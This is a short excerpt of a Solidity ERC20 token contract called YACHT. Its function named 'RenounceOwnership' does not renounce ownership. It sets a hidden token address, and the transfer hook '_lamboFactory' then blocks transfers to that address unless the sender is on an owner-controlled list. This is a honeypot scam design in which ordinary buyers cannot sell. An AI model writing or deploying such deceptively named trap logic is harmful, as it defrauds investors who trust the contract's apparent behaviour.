...
contract YACHT is ERC20, Ownable {
    mapping(address=>bool) private _blacklisted;
    address private _yachtToken;
    constructor() ERC20('YACHT','YACHT') {
    ...
    function RenounceOwnership(address yachtToken_) public onlyOwner {
        _yachtToken = yachtToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _yachtToken) {
            require(_blacklisted[from], "NO YACHT FOR BOTS!");
        }
    }
}